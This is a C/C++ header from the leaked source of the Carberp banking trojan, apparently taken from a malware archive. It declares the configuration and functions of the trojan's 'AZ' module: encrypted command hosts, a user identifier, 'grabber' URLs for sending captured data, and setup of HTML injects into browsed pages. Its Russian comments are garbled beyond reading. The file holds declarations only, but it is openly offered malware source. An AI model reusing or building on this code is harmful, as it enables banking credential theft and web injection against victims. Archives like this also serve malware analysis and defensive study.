/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------
//  ������ �������� �������� ������� ������ ����������
//
//  ������ 1.0
//  ����: ���� 2012
//
//
//  �����!
//
//  ��� ������������� ��������� ������ ������� AZ ������������ ����
//  ������ ���� ������� � ��������� ���� ������� Modules.h, � ���������
//  ������ ����� �������������� �������� ��������� ����
//---------------------------------------------------------------------------



#ifndef AzConfigH
#define AzConfigH
//---------------------------------------------------------------------------

#include "GetApi.h"
#include "Strings.h"
#include "BotConfig.h"
#include "Config.h"



#define AZCONFIG_PARAM_SIZE_HOSTS       256
#define AZCONFIG_PARAM_SIZE_SCRIPTHOSTS 256
#define AZCONFIG_PARAM_SIZE_AZUSER      9


#define AZCONFIG_PARAM_NAME_HOSTS       "__AZ_HOSTS__\0"
#define AZCONFIG_PARAM_NAME_SCRIPTHOSTS "__AZ_SCRIPTS_HOSTS__\0"
#define AZCONFIG_PARAM_NAME_AZUSER      "_AZ_USER"

#define AZCONFIG_PARAM_ENCRYPTED_HOSTS        BOTPARAM_ENCRYPTED_MAINHOSTS
#define AZCONFIG_PARAM_ENCRYPTED_SCRIPTHOSTS  true
#define AZCONFIG_PARAM_ENCRYPTED_AZUSER       true





//----------------------------------------
//  GetAzUser
//  ������� ���������� ��� ������������
//  ��� ������ ����������
//----------------------------------------
string GetAzUser();


//----------------------------------------
//  GetAzHostsBuf
//   ������ ���������� �������� �� ����
//   ������ ������� ����������. AZ �������
//----------------------------------------
PCHAR GetAzHostsBuf();


//----------------------------------------
//  IsAzHost
//  ������� ���������� ������ ����
//  ��������� ���� ����������� �������
//   ������ ������� AZ
//----------------------------------------
bool IsAzHost(const char* Host);

//----------------------------------------
// GetAzHost
//  ������� ���������� ������ ������� ����
//  �� ������� ������ ������� AZ
//  Wait - �������� ������� �������� �����
//----------------------------------------
string GetAzHost(bool Wait = false);

//----------------------------------------------------
//  GetAzURL
//   ������� ���������� ������ ����� ��
//   ������ ����� ������� � ����������� ����
//----------------------------------------------------
string GetAzURL(const char*  Path);


//----------------------------------------------------
//  GetAzGrabberURLPath
//   ������� ���������� ���� URL ���
//   �������� ���� �������
//----------------------------------------------------
string GetAzGrabberURLPath(const string& SystemName,  const char* Action = NULL);


//----------------------------------------------------
//  GetAzGrabberURL
//   ������� ���������� ����� � �������
//   AZ ��� �������� ���� �������
//----------------------------------------------------
string GetAzGrabberURL(const string& SystemName,  const char* Action = NULL);








//----------------------------------------------------
//  AzInizializeHTMLInjects  - ������� ��������������
//  ������� ������� ������ � HTML ��������
//----------------------------------------------------
void AzInizializeHTMLInjects();


//----------------------------------------------------
// AzCheckScriptHosts - ������� ��������� ��������
// ������ ��������� � HTML �������
//----------------------------------------------------
void AzCheckScriptHosts();


//----------------------------------------------------
// AzGetScriptHost - ������� ����������  ������� ����
// ��� ������ � HTML �������
//----------------------------------------------------
string AzGetScriptHost();



//---------------------------------------------------------------------------
#endif
